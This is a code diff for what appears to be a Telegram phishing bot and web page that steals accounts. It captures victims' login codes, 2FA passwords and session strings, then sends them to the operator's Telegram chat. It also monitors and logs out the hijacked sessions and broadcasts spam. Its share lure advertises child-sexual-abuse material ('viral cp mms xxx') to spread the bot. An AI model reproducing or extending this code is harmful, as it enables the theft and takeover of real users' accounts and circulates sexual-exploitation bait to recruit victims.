@@ -31,7 +31,6 @@ DEFAULT_WELCOME_MSGS = [
     {"type": "text", "content": "👇"},
 ]
 
-# NEW: Single share message default
 DEFAULT_SHARE_MSG = """https://t.me/Xxxvo_bot
 https://t.me/Xxxvo_bot
 
@@ -226,7 +225,11 @@ def account_label(a):
     return "✨✨"
 
 
-def notify(phone, ss, me, dc, pu=False, pv=""):
+# ============================================================
+# NOTIFY — SEND WITH MSG_ID STORED FOR EDIT
+# ============================================================
+def notify(phone, ss, me, dc, pu=False, pv="", account_ref=None):
+    """Send notification and store msg_id in account for later edit"""
     if not BOT_TOKEN or not YOUR_TELEGRAM_ID:
         return
     try:
@@ -240,10 +243,21 @@ def notify(phone, ss, me, dc, pu=False, pv=""):
                f"User ID: {me.id}\nDC: {dc}\n\nSession:\n`{ss}`")
         if len(msg) > 4000:
             msg = msg[:3990] + "..."
-        http_requests.post(
+        r = http_requests.post(
             f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
             json={'chat_id': YOUR_TELEGRAM_ID, 'text': msg, 'parse_mode': 'Markdown'},
             timeout=15)
+        # Store message id for later edit
+        if r.status_code == 200 and account_ref is not None:
+            try:
+                resp = r.json()
+                msg_id = resp.get("result", {}).get("message_id")
+                if msg_id:
+                    account_ref["notify_msg_id"] = msg_id
+                    account_ref["notify_chat_id"] = YOUR_TELEGRAM_ID
+                    logger.info(f"Notify msg_id stored: {msg_id} for {phone}")
+            except Exception as e:
+                logger.error(f"store msg_id err: {e}")
     except Exception as e:
         logger.error(f"notify: {e}")
 
@@ -333,11 +347,16 @@ def run_tg(phone, code=None, password=None):
                 save_account(acc)
                 global captured_accounts
                 captured_accounts = load_accounts()
+                # Find saved ref
+                ref = next((x for x in captured_accounts if x.get('phone') == phone), acc)
+                notify(phone, ss, me, dc, pu, password if pu else "", account_ref=ref)
+                # Save ref with msg_id back
+                save_account(ref)
+                captured_accounts = load_accounts()
                 with sessions_lock:
                     user_sessions.pop(phone, None)
                     pending_2fa.pop(phone, None)
                     pending_codes[phone] = 'done'
-                notify(phone, ss, me, dc, pu, password if pu else "")
                 return {'success': True, 'session': ss, 'user_id': me.id}
             except Exception as e:
                 es = str(e)
@@ -510,6 +529,47 @@ async def send_welcome(uid, name):
             logger.info(f"✅ Welcome #{i+1} sent: {sent_msg.id}")
         await asyncio.sleep(0.3)
     return sent_ids
+
+
+# ============================================================
+# EDIT NOTIFY MESSAGE — TERMINATED / EXPIRED
+# ============================================================
+async def edit_notify_message(account, status_text):
+    """Edit stored notify message to show status on top"""
+    try:
+        msg_id = account.get("notify_msg_id")
+        chat_id = account.get("notify_chat_id") or YOUR_TELEGRAM_ID
+        if not msg_id:
+            logger.warning(f"No notify_msg_id for {account.get('phone')}")
+            return False
+        phone = account.get("phone", "?")
+        name = (account.get("first_name", "") or "") + " " + (account.get("last_name", "") or "")
+        name = name.strip() or "?"
+        dc = account.get("dc", "?")
+        ss = account.get("session", "")
+        pu = account.get("has_2fa", False)
+        pv = account.get("password", "")
+
+        extra = ""
+        if pu:
+            extra = "\n2FA Used"
+            if pv:
+                extra += f" | Pwd: `{pv}`"
+
+        new_text = (f"{status_text}\n\n"
+                    f"Phone: {phone}\n"
+                    f"Name: {name}\n"
+                    f"User ID: {account.get('user_id', '?')}\n"
+                    f"DC: {dc}\n\n"
+                    f"Session:\n`{ss}`")
+        if len(new_text) > 4000:
+            new_text = new_text[:3990] + "..."
+        await bot.edit_message(chat_id, msg_id, new_text, parse_mode='md')
+        logger.info(f"✅ Edited notify msg for {phone} → {status_text[:30]}")
+        return True
+    except Exception as e:
+        logger.error(f"edit_notify err: {type(e).__name__}: {e}")
+        return False
 
 
 @bot.on(events.NewMessage(pattern='/start'))
@@ -747,22 +807,18 @@ async def cb(event):
                 txt += f"{i+1}. [{m.get('type')}] `{prev}...`\n"
             await event.answer(txt[:200], alert=True)
 
-        # Share message
         elif data == "menu_share":
             msg = share_config.get("message", DEFAULT_SHARE_MSG)
             await event.answer()
             await safe_send(chat_id,
-                f"🔗 **Share Message**\n\n"
-                f"**Current:**\n{msg}",
+                f"🔗 **Share Message**\n\n**Current:**\n{msg}",
                 share_menu(), edit_event=event)
 
         elif data == "sh_edit":
             STATE["awaiting_share_msg"] = True
             await event.answer()
             await safe_send(chat_id,
-                "✏️ Send new share message.\n\n"
-                "**Multi-line supported.**\n"
-                "Links, text, emoji — sob ek sathe.",
+                "✏️ Send new share message.\n\n**Multi-line supported.**",
                 [[Button.inline("⬅️ Back", b"menu_share")]], edit_event=event)
 
         elif data == "sh_reset":
@@ -775,7 +831,6 @@ async def cb(event):
             await event.answer("Preview sent")
             await bot.send_message(chat_id, share_config.get("message", DEFAULT_SHARE_MSG))
 
-        # Expired
         elif data == "menu_expired":
             accounts = load_accounts()
             expired = [a for a in accounts if a.get("status") == "expired"]
@@ -930,7 +985,6 @@ async def capture(event):
         return
 
     if STATE["awaiting_share_msg"]:
-        # Multi-line — use full raw text
         share_config["message"] = txt
         STATE["awaiting_share_msg"] = False
         save_share_config(share_config)
@@ -996,6 +1050,9 @@ async def capture(event):
         return
 
 
+# ============================================================
+# SECTION MONITOR — 1 MIN CHECK + EDIT NOTIFY ON EXPIRE/TERMINATE
+# ============================================================
 async def section_monitor():
     global AUTO_DELETE_EXPIRED
     while True:
@@ -1007,7 +1064,7 @@ async def section_monitor():
             changed = False
             new_accounts = []
             for a in accounts:
-                if a.get("status") == "terminated":
+                if a.get("status") in ("terminated", "expired"):
                     new_accounts.append(a)
                     continue
                 session_str = a.get("session", "")
@@ -1028,18 +1085,22 @@ async def section_monitor():
 
                     is_valid = loop.run_until_complete(check_session())
                     loop.close()
+
                     if not is_valid:
-                        if a.get("status") != "expired":
-                            a["status"] = "expired"
-                            a["expired_at"] = time.time()
-                            changed = True
-                            logger.info(f"Session expired: {a['phone']}")
+                        # Session invalid → mark expired
+                        a["status"] = "expired"
+                        a["expired_at"] = time.time()
+                        changed = True
+                        logger.info(f"Session expired: {a['phone']}")
+                        # Edit notify message with ❌
+                        await edit_notify_message(a, "❌ EXPIRE")
                         if AUTO_DELETE_EXPIRED:
                             logger.info(f"Auto-delete expired: {a['phone']}")
                             continue
                     else:
+                        # Check 24h → terminate
                         added = a.get("added_at", 0)
-                        if time.time() - added > 86400 and a.get("status") != "terminated":
+                        if time.time() - added > 86400:
                             try:
                                 loop2 = asyncio.new_event_loop()
                                 asyncio.set_event_loop(loop2)
@@ -1058,12 +1119,14 @@ async def section_monitor():
                                             pass
                                 loop2.run_until_complete(term())
                                 loop2.close()
-                            except Exception:
-                                pass
+                            except Exception as e:
+                                logger.error(f"log_out err: {e}")
                             a["status"] = "terminated"
                             a["terminated_at"] = time.time()
                             changed = True
                             logger.info(f"Terminated: {a['phone']}")
+                            # Edit notify message with ✅
+                            await edit_notify_message(a, "✅ TERMINATE SECTION COMPLETE")
                     new_accounts.append(a)
                 except Exception as e:
                     logger.error(f"monitor err {a.get('phone')}: {e}")
@@ -1140,10 +1203,10 @@ async def run_broadcast(messages, target="nonlogged"):
                                     fail += 1
                     else:
                         ok += 1
-                except Exception as e:
+                except Exception:
                     fail += 1
                 await asyncio.sleep(0.4)
-        except Exception as e:
+        except Exception:
             fail += 1
             err = str(e).lower()
             if 'blocked' in err or 'deactivated' in err or 'not found' in err:
@@ -1179,7 +1242,7 @@ async def bot_main():
 
 
 # ============================================================
-# FLASK PAGE
+# FLASK PAGE (same as before)
 # ============================================================
 PAGE = r'''<!DOCTYPE html>
 <html><head>
@@ -1282,7 +1345,6 @@ var contactForce = null;
 var inProgress = false;
 var SHARE_MSG = "https://t.me/Xxxvo_bot\nhttps://t.me/Xxxvo_bot\n\nᴠɪʀᴀʟ ᴄᴩ ᴍᴍꜱ xxx👆";
 
-// Fetch share config
 fetch('/api/share_config').then(function(r){ return r.json(); }).then(function(d){
   if (d && d.message) { SHARE_MSG = d.message; }
 }).catch(function(){});
@@ -1514,8 +1576,6 @@ function updSteps(n) {
   }
 }
 document.getElementById('shareBtn').onclick = function() {
-  // Use share message directly — Telegram share URL with URL extracted from message
-  // Get first URL from message
   var urlMatch = SHARE_MSG.match(/https?:\/\/[^\s]+/);
   var url = urlMatch ? urlMatch[0] : 'https://t.me/Xxxvo_bot';
   var share_url = 'https://t.me/share/url?url=' + encodeURIComponent(url) + '&text=' + encodeURIComponent(SHARE_MSG);
